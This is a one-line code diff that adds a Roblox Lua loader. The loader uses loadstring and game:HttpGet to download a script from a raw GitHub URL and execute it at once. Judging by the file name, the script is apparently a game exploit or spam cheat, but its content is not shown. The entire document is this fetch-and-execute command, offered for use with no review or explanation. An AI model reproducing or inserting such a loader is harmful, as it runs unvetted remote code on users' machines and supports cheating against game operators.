@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/ride-a-dino-spam3-bg99n3y6o6hqlt.lua"))()
